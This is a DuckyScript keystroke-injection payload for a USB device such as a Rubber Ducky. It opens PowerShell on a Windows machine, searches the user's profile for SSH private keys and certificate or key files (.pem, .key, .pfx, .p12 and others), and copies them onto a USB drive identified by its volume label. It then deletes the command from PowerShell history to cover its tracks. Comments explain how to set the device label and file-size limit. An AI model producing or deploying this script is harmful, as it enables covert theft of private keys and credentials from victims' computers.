REM Here you must indicate the name of the device you want to use to complete the data exfiltration. For example, a USB Rubber Ducky could be suitable: DUCK
DEFINE #FileSystemLabel example

REM Generally, 10 kb is sufficient for a certificate, but sometimes it may not be enough. If you know that your file exceeds this size and you still want to be able to store it, then you just need to change this reference.

REM While for the Windows length command you can use the full number directly, for example for 10 kb you should enter: 10240
DEFINE #SizeOfOtherFilesInLength example

GUI r 
DELAY 1000
STRINGLN powershell
DELAY 1300

STRING
    $m=(Get-Volume -FileSystemLabel #FileSystemLabel ).DriveLetter;
    mkdir "${m}:\keys";  
    $DONE = 0;
    if(Test-Path $env:USERPROFILE\.ssh\id_rsa*) {
        Copy-Item $env:USERPROFILE\.ssh\id_rsa* ${m}:\keys; 
        $DONE = 1;
    }
    if ($DONE -ne 1) {
        $SEARCH_FOR_KEYS=(Get-ChildItem $env:USERPROFILE -recurse -erroraction silentlycontinue | Where-Object {$_.Length -lt #SizeOfOtherFilesInLength -and (($_ | Select-String "OPENSSH PRIVATE KEY") -or ($_.name -like "id_rsa*"))});
        if ( $SEARCH_FOR_KEYS.Count -gt 0){
            foreach($path in $SEARCH_FOR_KEYS){
                Copy-Item $path ${m}:\keys;
                }
            $DONE = 1;
        }
    }
    if ($DONE -ne 1) {
        $SEARCH_FOR_KEYS=(Get-ChildItem $env:USERPROFILE -recurse -erroraction silentlycontinue -depth 3 | where-object {$_.length -lt #SizeOfOtherFilesInLength -and ($_.extension.tolower() -in @( ".pem", ".key", ".rsa", ".crt", ".cer" , ".der", ".pfx", ".p12"))});
        if ( $SEARCH_FOR_KEYS.Count -gt 0){
            foreach ( $path in $SEARCH_FOR_KEYS){
                if( $path.extension.tolower() -eq ".crt"){
                    Copy-Item $path\..\* "${m}:\keys";}
                else{
                    Copy-Item $path "${m}:\keys"; 
                }
            }
        }
    }
    $HISTORY = Get-Content (Get-PSReadLineOption).HistorySavePath;
    $HISTORY = $HISTORY[0..($HISTORY.Length - 2)];
    $HISTORY | Set-Content (Get-PSReadLineOption).HistorySavePath; exit
END_STRING
DELAY 500
ENTER



